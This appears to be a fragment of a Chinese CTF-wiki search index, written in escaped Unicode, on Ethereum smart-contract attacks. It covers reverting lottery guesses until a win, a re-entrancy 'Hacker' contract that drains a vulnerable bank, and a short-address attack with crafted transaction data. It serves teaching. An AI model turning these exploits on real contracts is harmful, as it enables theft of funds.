\u53ef\u4ee5\u89c2\u5bdf\u5230\u9898\u76ee\u5408\u7ea6\u5728\u6211\u4eec\u731c\u5bf9\u6216\u731c\u9519\u65f6\u6536\u8d39\u4e0d\u540c\uff0c\u5206\u522b\u4e3a 1 ether \u6216 0.5 ether \uff0c\u6211\u4eec\u731c\u6570\u65f6\u591a\u7ed9\u7684\u94b1\u4f1a\u8f6c\u8d26\u8fd8\u7ed9\u6211\u4eec\u3002\u7ed3\u5408\u667a\u80fd\u5408\u7ea6\u6536\u5230\u8f6c\u8d26\u65f6\u4f1a\u8c03\u7528 fallback \u51fd\u6570\u7684\u77e5\u8bc6\u70b9\uff0c\u5047\u8bbe\u6bcf\u6b21\u4f7f\u7528 2 ether \u53bb\u731c\u6570\uff0c\u5982\u679c fallback \u51fd\u6570\u6536\u5230 1.5 ether \u5c31\u56de\u6eda\u3002\u6211\u4eec\u53ef\u4ee5\u56fa\u5b9a\u4e00\u4e2a\u6570\u5b57\u4e00\u76f4\u731c\uff0c\u53ea\u6709\u731c\u5bf9\u7684\u4ea4\u6613\u624d\u4f1a\u88ab\u786e\u8ba4\u3002 function guess () public { task . bet . value ( 2 ether )( 1 ); } function () public payable { require ( msg.value != 1 . 5 ether ); } \u5e76\u4e0d\u662f\u6240\u6709\u9898\u76ee\u90fd\u6d89\u53ca\u8f6c\u8d26\u64cd\u4f5c\uff0c\u4f46\u662f\u901a\u5e38\u90fd\u4f1a\u6709\u4e00\u4e2a\u53d8\u91cf\u8c61\u5f81\u7740\u6b63\u786e\u6b21\u6570\u7b49\uff0cZeroLottery \u4e2d\u5c31\u6709 balanceOf[msg.sender] \u5728\u731c\u5bf9\u65f6\u4f1a\u589e\u52a0\uff0c\u731c\u9519\u65f6\u6e05\u96f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5b83\u5224\u65ad\u662f\u5426\u731c\u5bf9\u3002 function guess () public { task . bet . value ( 2 ether )( 1 ); require ( task . balanceOf ( this )); } \u4ee5\u4e0a\u4e24\u79cd\u65b9\u6cd5\u90fd\u662f\u9009\u5b9a\u4e00\u4e2a\u6570\u5b57\u91cd\u590d\u731c\u6d4b\uff0c\u5728\u672c\u9898\u516b\u5206\u4e4b\u4e00\u7684\u6982\u7387\u4e4b\u4e0b\u731c\u5bf9\u4e94\u6b21\u83b7\u80dc\uff0c\u9700\u8981\u5927\u7ea6 40 \u7b14\u4ea4\u6613\u624d\u80fd\u5b8c\u6210\u3002\u7531\u4e8e\u540c\u4e00\u4e2a\u533a\u5757\u4e2d\u4ea7\u751f\u7684\u968f\u673a\u6570\u5f80\u5f80\u76f8\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u7a0d\u4f5c\u6539\u8fdb\uff0c\u5728\u6bcf\u4e2a\u533a\u5757\u4e2d\u5c06\u6240\u6709\u516b\u79cd\u53ef\u80fd\u90fd\u731c\u6d4b\u4e00\u904d\uff0c\u5176\u4e2d\u5fc5\u5b9a\u5305\u542b\u6b63\u786e\u7684\u6570\u5b57\u3002\u8fdb\u4e00\u6b65\uff0c\u5982\u679c\u5728\u5355\u7b14\u4ea4\u6613\u4e2d\u8fde\u7eed\u731c\u4e94\u6b21\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u6709\u4e00\u7b14\u4ea4\u6613\u6210\u529f\u786e\u8ba4\u5c31\u53ef\u4ee5\u5b8c\u6210\u9898\u76ee\u8981\u6c42\u3002\u5b9e\u9645\u4e0a\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u7684 bet \u51fd\u6570\u81ea\u5e26\u4e86 balanceOf \u975e\u96f6\u7684\u68c0\u67e5\uff0c\u5982\u679c\u6211\u4eec\u8fde\u731c\u591a\u6b21\uff0c\u5931\u8d25\u4e86\u4e5f\u4f1a\u81ea\u52a8\u56de\u6eda\u3002","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/randomness/#_15","text":"0ctf final 2018 : ZeroLottery Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/re-entrancy/","text":"Re-Entrancy \u00b6 \u91cd\u5165\u653b\u51fb\u662f\u667a\u80fd\u5408\u7ea6\u4e2d\u7684\u7ecf\u5178\u653b\u51fb\u3002\u4ee5\u592a\u574a The DAO \u9879\u76ee\u906d\u53d7\u7684\u91cd\u5165\u653b\u51fb\u76f4\u63a5\u5bfc\u81f4\u4e86\u4ee5\u592a\u574a\uff08ETH\uff09\u548c\u4ee5\u592a\u574a\u7ecf\u5178\uff08ETC\uff09\u7684\u786c\u5206\u53c9\u3002 \u539f\u7406 \u00b6 \u5047\u8bbe\u6709\u4e00\u4e2a\u94f6\u884c\u5408\u7ea6\u5b9e\u73b0\u4e86\u4ee5\u4e0b\u53d6\u6b3e\u529f\u80fd\uff0c\u5728 balanceOf[msg.sender] \u5145\u8db3\u65f6\uff0c\u5408\u7ea6\u4f1a\u8f6c\u8d26\u76f8\u5e94\u6570\u91cf\u7684\u4ee5\u592a\u5e01\u7ed9\u8c03\u7528\u8005\uff0c\u5e76\u4e14\u5c06 balanceOf \u51cf\u53bb\u76f8\u5e94\u503c\uff1a contract Bank { mapping ( address => uint256 ) public balanceOf ; ... function withdraw ( uint256 amount ) public { require ( balanceOf [ msg.sender ] >= amount ); msg.sender . call . value ( amount )(); balanceOf [ msg.sender ] -= amount ; } } \u8fd9\u4e2a\u5b9e\u73b0\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u201c\u5148\u7ed9\u94b1\u540e\u8bb0\u8d26\u201d\u3002\u5728\u4ee5\u592a\u574a\u4e2d\uff0c\u5408\u7ea6\u7684\u8c03\u7528\u8005\u53ef\u4ee5\u662f\u53e6\u4e00\u4e2a\u667a\u80fd\u5408\u7ea6\uff0c\u8f6c\u8d26\u65f6\u6536\u6b3e\u5408\u7ea6\u7684 fallback \u51fd\u6570\u4f1a\u88ab\u8c03\u7528\u3002\u82e5 fallback \u51fd\u6570\u5185\u518d\u4e00\u6b21\u8c03\u7528\u4e86\u5bf9\u65b9\u7684 withdraw \u51fd\u6570\uff0c\u7531\u4e8e\u6b64\u65f6 balanceOf \u5c1a\u672a\u51cf\u5c11\uff0crequire \u7684\u6761\u4ef6\u4ecd\u7136\u6ee1\u8db3\uff0c\u5bfc\u81f4\u53ef\u4ee5\u518d\u6b21\u53d6\u6b3e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cfallback \u51fd\u6570\u9700\u8981\u9650\u5236\u91cd\u5165\u7684\u6b21\u6570\uff0c\u5426\u5219\u4f1a\u56e0\u4e3a\u65e0\u9650\u5730\u5faa\u73af\u8c03\u7528\uff0c\u5bfc\u81f4 gas \u4e0d\u8db3\u3002\u5047\u8bbe\u653b\u51fb\u5408\u7ea6\u7684\u5b58\u6b3e\u6709 1 ether\uff0c\u53ef\u4ee5\u5982\u4e0b\u5b9e\u73b0\u53d6\u51fa 2 ether\uff1a contract Hacker { bool status = false ; Bank b ; constructor ( address addr ) public { b = Bank ( addr ); } function hack () public { b . withdraw ( 1 ether ); } function () public payable { if ( ! status ) { status = true ; b . withdraw ( 1 ether ); } } } \u6b64\u5916\u6709\u51e0\u4e2a\u6ce8\u610f\u70b9\uff1a \u76ee\u6807\u5408\u7ea6\u4f7f\u7528 call \u53d1\u9001\u4ee5\u592a\u5e01\u65f6\uff0c\u9ed8\u8ba4\u63d0\u4f9b\u6240\u6709\u5269\u4f59 gas\uff1bcall \u64cd\u4f5c\u6539\u4e3a\u5bf9\u63d0\u6b3e\u8005\u5408\u7ea6\u7684\u8c03\u7528\u4ea6\u53ef\u5b9e\u73b0\u653b\u51fb\uff1b\u4f46\u5982\u679c\u4f7f\u7528 transfer \u6216\u8005 send \u6765\u53d1\u9001\u4ee5\u592a\u5e01\uff0c\u53ea\u6709 2300 gas \u4f9b\u653b\u51fb\u5408\u7ea6\u4f7f\u7528\uff0c\u662f\u4e0d\u8db3\u4ee5\u5b8c\u6210\u91cd\u5165\u653b\u51fb\u7684\u3002 \u6267\u884c\u91cd\u5165\u653b\u51fb\u524d\uff0c\u9700\u8981\u786e\u8ba4\u76ee\u6807\u5408\u7ea6\u6709\u8db3\u591f\u7684\u4ee5\u592a\u5e01\u6765\u5411\u6211\u4eec\u591a\u6b21\u8f6c\u8d26\u3002\u5982\u679c\u76ee\u6807\u5408\u7ea6\u6ca1\u6709 payable \u7684 fallback \u51fd\u6570\uff0c\u5219\u9700\u8981\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u901a\u8fc7 selfdestruct \u81ea\u6bc1\u5f3a\u5236\u8f6c\u8d26\u3002 \u4e0a\u8ff0 fallback \u5b9e\u73b0\u4e2d\uff0c\u5148\u6539\u5199 status \u540e\u91cd\u5165\u3002\u5982\u679c\u53cd\u8fc7\u6765\u5219\u8fd8\u662f\u4f1a\u65e0\u9650\u5faa\u73af\u8c03\u7528\uff0c\u8fd9\u548c\u91cd\u5165\u6f0f\u6d1e\u7684\u9053\u7406\u662f\u4e00\u81f4\u7684\u3002 \u91cd\u5165\u6f0f\u6d1e\u4e0e\u6574\u6570\u4e0b\u6ea2\u51fa\u6f0f\u6d1e\u5173\u8054\u5bc6\u5207\u3002\u5728\u4e0a\u8ff0\u653b\u51fb\u540e\uff0c\u653b\u51fb\u5408\u7ea6\u7684\u5b58\u6b3e\u7531 1 ether \u53d8\u4e3a -1 ether\u3002\u4f46\u6ce8\u610f\u5230\u5b58\u6b3e\u7531 uint256 \u4fdd\u5b58\uff0c\u8d1f\u6570\u5b9e\u9645\u4e0a\u4fdd\u5b58\u4e3a\u4e00\u4e2a\u6781\u5927\u7684\u6b63\u6570\uff0c\u540e\u7eed\u653b\u51fb\u5408\u7ea6\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u8fd9\u4e2a\u5927\u6570\u989d\u7684\u5b58\u6b3e\u3002 \u9898\u76ee \u00b6 \u5f3a\u7f51\u676f 2019 \u00b6 \u9898\u76ee\u540d\u79f0 babybank N1CTF 2019 \u00b6 \u9898\u76ee\u540d\u79f0 h4ck Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Re-Entrancy"},{"location":"blockchain/ethereum/attacks/re-entrancy/#re-entrancy","text":"\u91cd\u5165\u653b\u51fb\u662f\u667a\u80fd\u5408\u7ea6\u4e2d\u7684\u7ecf\u5178\u653b\u51fb\u3002\u4ee5\u592a\u574a The DAO \u9879\u76ee\u906d\u53d7\u7684\u91cd\u5165\u653b\u51fb\u76f4\u63a5\u5bfc\u81f4\u4e86\u4ee5\u592a\u574a\uff08ETH\uff09\u548c\u4ee5\u592a\u574a\u7ecf\u5178\uff08ETC\uff09\u7684\u786c\u5206\u53c9\u3002","title":"Re-Entrancy"},{"location":"blockchain/ethereum/attacks/re-entrancy/#_1","text":"\u5047\u8bbe\u6709\u4e00\u4e2a\u94f6\u884c\u5408\u7ea6\u5b9e\u73b0\u4e86\u4ee5\u4e0b\u53d6\u6b3e\u529f\u80fd\uff0c\u5728 balanceOf[msg.sender] \u5145\u8db3\u65f6\uff0c\u5408\u7ea6\u4f1a\u8f6c\u8d26\u76f8\u5e94\u6570\u91cf\u7684\u4ee5\u592a\u5e01\u7ed9\u8c03\u7528\u8005\uff0c\u5e76\u4e14\u5c06 balanceOf \u51cf\u53bb\u76f8\u5e94\u503c\uff1a contract Bank { mapping ( address => uint256 ) public balanceOf ; ... function withdraw ( uint256 amount ) public { require ( balanceOf [ msg.sender ] >= amount ); msg.sender . call . value ( amount )(); balanceOf [ msg.sender ] -= amount ; } } \u8fd9\u4e2a\u5b9e\u73b0\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u201c\u5148\u7ed9\u94b1\u540e\u8bb0\u8d26\u201d\u3002\u5728\u4ee5\u592a\u574a\u4e2d\uff0c\u5408\u7ea6\u7684\u8c03\u7528\u8005\u53ef\u4ee5\u662f\u53e6\u4e00\u4e2a\u667a\u80fd\u5408\u7ea6\uff0c\u8f6c\u8d26\u65f6\u6536\u6b3e\u5408\u7ea6\u7684 fallback \u51fd\u6570\u4f1a\u88ab\u8c03\u7528\u3002\u82e5 fallback \u51fd\u6570\u5185\u518d\u4e00\u6b21\u8c03\u7528\u4e86\u5bf9\u65b9\u7684 withdraw \u51fd\u6570\uff0c\u7531\u4e8e\u6b64\u65f6 balanceOf \u5c1a\u672a\u51cf\u5c11\uff0crequire \u7684\u6761\u4ef6\u4ecd\u7136\u6ee1\u8db3\uff0c\u5bfc\u81f4\u53ef\u4ee5\u518d\u6b21\u53d6\u6b3e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cfallback \u51fd\u6570\u9700\u8981\u9650\u5236\u91cd\u5165\u7684\u6b21\u6570\uff0c\u5426\u5219\u4f1a\u56e0\u4e3a\u65e0\u9650\u5730\u5faa\u73af\u8c03\u7528\uff0c\u5bfc\u81f4 gas \u4e0d\u8db3\u3002\u5047\u8bbe\u653b\u51fb\u5408\u7ea6\u7684\u5b58\u6b3e\u6709 1 ether\uff0c\u53ef\u4ee5\u5982\u4e0b\u5b9e\u73b0\u53d6\u51fa 2 ether\uff1a contract Hacker { bool status = false ; Bank b ; constructor ( address addr ) public { b = Bank ( addr ); } function hack () public { b . withdraw ( 1 ether ); } function () public payable { if ( ! status ) { status = true ; b . withdraw ( 1 ether ); } } } \u6b64\u5916\u6709\u51e0\u4e2a\u6ce8\u610f\u70b9\uff1a \u76ee\u6807\u5408\u7ea6\u4f7f\u7528 call \u53d1\u9001\u4ee5\u592a\u5e01\u65f6\uff0c\u9ed8\u8ba4\u63d0\u4f9b\u6240\u6709\u5269\u4f59 gas\uff1bcall \u64cd\u4f5c\u6539\u4e3a\u5bf9\u63d0\u6b3e\u8005\u5408\u7ea6\u7684\u8c03\u7528\u4ea6\u53ef\u5b9e\u73b0\u653b\u51fb\uff1b\u4f46\u5982\u679c\u4f7f\u7528 transfer \u6216\u8005 send \u6765\u53d1\u9001\u4ee5\u592a\u5e01\uff0c\u53ea\u6709 2300 gas \u4f9b\u653b\u51fb\u5408\u7ea6\u4f7f\u7528\uff0c\u662f\u4e0d\u8db3\u4ee5\u5b8c\u6210\u91cd\u5165\u653b\u51fb\u7684\u3002 \u6267\u884c\u91cd\u5165\u653b\u51fb\u524d\uff0c\u9700\u8981\u786e\u8ba4\u76ee\u6807\u5408\u7ea6\u6709\u8db3\u591f\u7684\u4ee5\u592a\u5e01\u6765\u5411\u6211\u4eec\u591a\u6b21\u8f6c\u8d26\u3002\u5982\u679c\u76ee\u6807\u5408\u7ea6\u6ca1\u6709 payable \u7684 fallback \u51fd\u6570\uff0c\u5219\u9700\u8981\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u901a\u8fc7 selfdestruct \u81ea\u6bc1\u5f3a\u5236\u8f6c\u8d26\u3002 \u4e0a\u8ff0 fallback \u5b9e\u73b0\u4e2d\uff0c\u5148\u6539\u5199 status \u540e\u91cd\u5165\u3002\u5982\u679c\u53cd\u8fc7\u6765\u5219\u8fd8\u662f\u4f1a\u65e0\u9650\u5faa\u73af\u8c03\u7528\uff0c\u8fd9\u548c\u91cd\u5165\u6f0f\u6d1e\u7684\u9053\u7406\u662f\u4e00\u81f4\u7684\u3002 \u91cd\u5165\u6f0f\u6d1e\u4e0e\u6574\u6570\u4e0b\u6ea2\u51fa\u6f0f\u6d1e\u5173\u8054\u5bc6\u5207\u3002\u5728\u4e0a\u8ff0\u653b\u51fb\u540e\uff0c\u653b\u51fb\u5408\u7ea6\u7684\u5b58\u6b3e\u7531 1 ether \u53d8\u4e3a -1 ether\u3002\u4f46\u6ce8\u610f\u5230\u5b58\u6b3e\u7531 uint256 \u4fdd\u5b58\uff0c\u8d1f\u6570\u5b9e\u9645\u4e0a\u4fdd\u5b58\u4e3a\u4e00\u4e2a\u6781\u5927\u7684\u6b63\u6570\uff0c\u540e\u7eed\u653b\u51fb\u5408\u7ea6\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u8fd9\u4e2a\u5927\u6570\u989d\u7684\u5b58\u6b3e\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/re-entrancy/#_2","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/re-entrancy/#2019","text":"\u9898\u76ee\u540d\u79f0 babybank","title":"\u5f3a\u7f51\u676f 2019"},{"location":"blockchain/ethereum/attacks/re-entrancy/#n1ctf-2019","text":"\u9898\u76ee\u540d\u79f0 h4ck Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"N1CTF 2019"},{"location":"blockchain/ethereum/attacks/shortaddress/","text":"Short Address Attack \u00b6 \u539f\u7406 \u00b6 \u77ed\u5730\u5740\u653b\u51fb\uff0c\u5229\u7528 EVM \u5728\u53c2\u6570\u957f\u5ea6\u4e0d\u591f\u65f6\u81ea\u52a8\u5728\u53f3\u65b9\u8865 0 \u7684\u7279\u6027\uff0c\u901a\u8fc7\u53bb\u9664\u94b1\u5305\u5730\u5740\u672b\u4f4d\u7684 0\uff0c\u8fbe\u5230\u5c06\u8f6c\u8d26\u91d1\u989d\u5de6\u79fb\u653e\u5927\u7684\u6548\u679c\u3002 \u4f8b\u5b50 \u00b6 pragma solidity ^ 0.4.10 ; contract Coin { address owner ; mapping ( address => uint256 ) public balances ; modifier OwnerOnly () { require ( msg.sender == owner ); _ ; } function ICoin () { owner = msg.sender ; } function approve ( address _to , uint256 _amount ) OwnerOnly { balances [ _to ] += _amount ; } function transfer ( address _to , uint256 _amount ) { require ( balances [ msg.sender ] > _amount ); balances [ msg.sender ] -= _amount ; balances [ _to ] += _amount ; } } \u5177\u4f53\u4ee3\u5e01\u529f\u80fd\u7684\u5408\u7ea6 Coin\uff0c\u5f53 A \u8d26\u6237\u5411 B \u8d26\u6237\u8f6c\u4ee3\u5e01\u65f6\u8c03\u7528 transfer() \u51fd\u6570\uff0c\u4f8b\u5982 A \u8d26\u6237\uff080x14723a09acff6d2a60dcdf7aa4aff308fddc160c\uff09\u5411 B \u8d26\u6237\uff080x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db\uff09\u8f6c 8 \u4e2a Coin\uff0c msg.data \u6570\u636e\u4e3a\uff1a 0xa9059cbb -> bytes4(keccak256(\"transfer(address,uint256)\")) \u51fd\u6570\u7b7e\u540d 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db -> B \u8d26\u6237\u5730\u5740\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 0000000000000000000000000000000000000000000000000000000000000008 -> 0x8\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 \u90a3\u4e48\u77ed\u5730\u5740\u653b\u51fb\u662f\u600e\u4e48\u505a\u7684\u5462\uff0c\u653b\u51fb\u8005\u627e\u5230\u4e00\u4e2a\u672b\u5c3e\u662f 00 \u8d26\u6237\u5730\u5740\uff0c\u5047\u8bbe\u4e3a 0x4b0897b0513fdc7c541b6d9d7e929c4e5364d200\uff0c\u90a3\u4e48\u6b63\u5e38\u60c5\u51b5\u4e0b\u6574\u4e2a\u8c03\u7528\u7684 msg.data \u5e94\u8be5\u4e3a\uff1a 0xa9059cbb -> bytes4(keccak256(\"transfer(address,uint256)\")) \u51fd\u6570\u7b7e\u540d 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200 -> B \u8d26\u6237\u5730\u5740\uff08\u6ce8\u610f\u672b\u5c3e 00\uff09 0000000000000000000000000000000000000000000000000000000000000008 -> 0x8\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 \u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06 B \u5730\u5740\u7684 00 \u5403\u6389\uff0c\u4e0d\u8fdb\u884c\u4f20\u9012\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u5c11\u4f20\u9012 1 \u4e2a\u5b57\u8282\u53d8\u6210 4+31+32\uff1a 0xa9059cbb -> bytes4(keccak256(\"transfer(address,uint256)\")) \u51fd\u6570\u7b7e\u540d 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2 -> B \u5730\u5740\uff0831 \u5b57\u8282\uff09 0000000000000000000000000000000000000000000000000000000000000008 -> 0x8\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 \u5f53\u4e0a\u9762\u6570\u636e\u8fdb\u5165 EVM \u8fdb\u884c\u5904\u7406\u65f6\uff0c\u5bf9\u53c2\u6570\u8fdb\u884c\u7f16\u7801\u5bf9\u9f50\u540e\u8865 00 \u53d8\u4e3a\uff1a 0xa9059cbb 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200 0000000000000000000000000000000000000000000000000000000000000800 \u4e5f\u5c31\u662f\u8bf4\uff0c\u6076\u610f\u6784\u9020\u7684 msg.data \u901a\u8fc7 EVM \u89e3\u6790\u8865 0 \u64cd\u4f5c\uff0c\u5bfc\u81f4\u539f\u672c 0x8 = 8 \u53d8\u4e3a\u4e86 0x800 = 2048 \u4e0a\u8ff0 EVM \u5bf9\u7578\u5f62\u5b57\u8282\u7684 msg.data \u8fdb\u884c\u8865\u4f4d\u64cd\u4f5c\u7684\u884c\u4e3a\u5176\u5b9e\u5c31\u662f\u77ed\u5730\u5740\u653b\u51fb\u7684\u539f\u7406 \u9898\u76ee \u00b6 \u8fd9\u4e2a\u76ee\u524d\u6ca1\u6709\u9898\u76ee\uff0c\u57fa\u672c\u5df2\u7ecf\u88ab\u4fee\u590d\u3002\u4e0d\u8fc7\u53ef\u4ee5\u590d\u73b0\u6210\u529f\uff0c\u4f46\u662f\u4e0d\u80fd\u901a\u8fc7 Remix \u590d\u73b0\uff0c\u56e0\u4e3a\u5ba2\u6237\u7aef\u4f1a\u68c0\u67e5\u5730\u5740\u957f\u5ea6\uff1b\u4e5f\u4e0d\u80fd\u901a\u8fc7 sendTransaction()\uff0c\u56e0\u4e3a web3 \u4e2d\u4e5f\u52a0\u4e86\u4fdd\u62a4\u3002 \u4f46\u662f\uff0c\u53ef\u4ee5\u4f7f\u7528 geth \u642d\u5efa\u79c1\u94fe\uff0c\u4f7f\u7528 sendRawTransaction() \u53d1\u9001\u4ea4\u6613\u590d\u73b0\uff0c\u53ef\u81ea\u884c\u5c1d\u8bd5\u3002 Note \u6ce8\uff1a\u76ee\u524d\u4e3b\u8981\u4f9d\u9760\u5ba2\u6237\u7aef\u4e3b\u52a8\u68c0\u67e5\u5730\u5740\u957f\u5ea6\u6765\u907f\u514d\u8be5\u95ee\u9898\uff0c\u53e6\u5916 web3 \u5c42\u9762\u4e5f\u589e\u52a0\u4e86\u53c2\u6570\u683c\u5f0f\u6821\u9a8c\u3002\u867d\u7136 EVM \u5c42\u4ecd\u7136\u53ef\u4ee5\u590d\u73b0\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u5e94\u7528\u573a\u666f\u4e2d\u57fa\u672c\u6ca1\u6709\u95ee\u9898\u3002","title":"Short Address Attack"},{"location":"blockchain/ethereum/attacks/shortaddress/#short-address-attack","text":"","title":"Short Address Attack"},{"location":"blockchain/ethereum/attacks/shortaddress/#_1","text":"\u77ed\u5730\u5740\u653b\u51fb\uff0c\u5229\u7528 EVM \u5728\u53c2\u6570\u957f\u5ea6\u4e0d\u591f\u65f6\u81ea\u52a8\u5728\u53f3\u65b9\u8865 0 \u7684\u7279\u6027\uff0c\u901a\u8fc7\u53bb\u9664\u94b1\u5305\u5730\u5740\u672b\u4f4d\u7684 0\uff0c\u8fbe\u5230\u5c06\u8f6c\u8d26\u91d1\u989d\u5de6\u79fb\u653e\u5927\u7684\u6548\u679c\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/shortaddress/#_2","text":"pragma solidity ^ 0.4.10 ; contract Coin { address owner ; mapping ( address => uint256 ) public balances ; modifier OwnerOnly () { require ( msg.sender == owner ); _ ; } function ICoin () { owner = msg.sender ; } function approve ( address _to , uint256 _amount ) OwnerOnly { balances [ _to ] += _amount ; } function transfer ( address _to , uint256 _amount ) { require ( balances [ msg.sender ] > _amount ); balances [ msg.sender ] -= _amount ; balances [ _to ] += _amount ; } } \u5177\u4f53\u4ee3\u5e01\u529f\u80fd\u7684\u5408\u7ea6 Coin\uff0c\u5f53 A \u8d26\u6237\u5411 B \u8d26\u6237\u8f6c\u4ee3\u5e01\u65f6\u8c03\u7528 transfer() \u51fd\u6570\uff0c\u4f8b\u5982 A \u8d26\u6237\uff080x14723a09acff6d2a60dcdf7aa4aff308fddc160c\uff09\u5411 B \u8d26\u6237\uff080x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db\uff09\u8f6c 8 \u4e2a Coin\uff0c msg.data \u6570\u636e\u4e3a\uff1a 0xa9059cbb -> bytes4(keccak256(\"transfer(address,uint256)\")) \u51fd\u6570\u7b7e\u540d 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db -> B \u8d26\u6237\u5730\u5740\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 0000000000000000000000000000000000000000000000000000000000000008 -> 0x8\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 \u90a3\u4e48\u77ed\u5730\u5740\u653b\u51fb\u662f\u600e\u4e48\u505a\u7684\u5462\uff0c\u653b\u51fb\u8005\u627e\u5230\u4e00\u4e2a\u672b\u5c3e\u662f 00 \u8d26\u6237\u5730\u5740\uff0c\u5047\u8bbe\u4e3a 0x4b0897b0513fdc7c541b6d9d7e929c4e5364d200\uff0c\u90a3\u4e48\u6b63\u5e38\u60c5\u51b5\u4e0b\u6574\u4e2a\u8c03\u7528\u7684 msg.data \u5e94\u8be5\u4e3a\uff1a 0xa9059cbb -> bytes4(keccak256(\"transfer(address,uint256)\")) \u51fd\u6570\u7b7e\u540d 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200 -> B \u8d26\u6237\u5730\u5740\uff08\u6ce8\u610f\u672b\u5c3e 00\uff09 0000000000000000000000000000000000000000000000000000000000000008 -> 0x8\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 \u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06 B \u5730\u5740\u7684 00 \u5403\u6389\uff0c\u4e0d\u8fdb\u884c\u4f20\u9012\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u5c11\u4f20\u9012 1 \u4e2a\u5b57\u8282\u53d8\u6210 4+31+32\uff1a 0xa9059cbb -> bytes4(keccak256(\"transfer(address,uint256)\")) \u51fd\u6570\u7b7e\u540d 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2 -> B \u5730\u5740\uff0831 \u5b57\u8282\uff09 0000000000000000000000000000000000000000000000000000000000000008 -> 0x8\uff08\u524d\u8865 0 \u8865\u9f50 32 \u5b57\u8282\uff09 \u5f53\u4e0a\u9762\u6570\u636e\u8fdb\u5165 EVM \u8fdb\u884c\u5904\u7406\u65f6\uff0c\u5bf9\u53c2\u6570\u8fdb\u884c\u7f16\u7801\u5bf9\u9f50\u540e\u8865 00 \u53d8\u4e3a\uff1a 0xa9059cbb 0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200 0000000000000000000000000000000000000000000000000000000000000800 \u4e5f\u5c31\u662f\u8bf4\uff0c\u6076\u610f\u6784\u9020\u7684 msg.data \u901a\u8fc7 EVM \u89e3\u6790\u8865 0 \u64cd\u4f5c\uff0c\u5bfc\u81f4\u539f\u672c 0x8 = 8 \u53d8\u4e3a\u4e86 0x800 = 2048 \u4e0a\u8ff0 EVM \u5bf9\u7578\u5f62\u5b57\u8282\u7684 msg.data \u8fdb\u884c\u8865\u4f4d\u64cd\u4f5c\u7684\u884c\u4e3a\u5176\u5b9e\u5c31\u662f\u77ed\u5730\u5740\u653b\u51fb\u7684\u539f\u7406","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/shortaddress/#_3","text":"\u8fd9\u4e2a\u76ee\u524d\u6ca1\u6709\u9898\u76ee\uff0c\u57fa\u672c\u5df2\u7ecf\u88ab\u4fee\u590d\u3002\u4e0d\u8fc7\u53ef\u4ee5\u590d\u73b0\u6210\u529f\uff0c\u4f46\u662f\u4e0d\u80fd\u901a\u8fc7 Remix \u590d\u73b0\uff0c\u56e0\u4e3a\u5ba2\u6237\u7aef\u4f1a\u68c0\u67e5\u5730\u5740\u957f\u5ea6\uff1b\u4e5f\u4e0d\u80fd\u901a\u8fc7 sendTransaction()\uff0c\u56e0\u4e3a web3 \u4e2d\u4e5f\u52a0\u4e86\u4fdd\u62a4\u3002 \u4f46\u662f\uff0c\u53ef\u4ee5\u4f7f\u7528 geth \u642d\u5efa\u79c1\u94fe\uff0c\u4f7f\u7528 sendRawTransaction() \u53d1\u9001\u4ea4\u6613\u590d\u73b0\uff0c\u53ef\u81ea\u884c\u5c1d\u8bd5\u3002 Note \u6ce8\uff1a\u76ee\u524d\u4e3b\u8981\u4f9d\u9760\u5ba2\u6237\u7aef\u4e3b\u52a8\u68c0\u67e5\u5730\u5740\u957f\u5ea6\u6765\u907f\u514d\u8be5\u95ee\u9898\uff0c\u53e6\u5916 web3 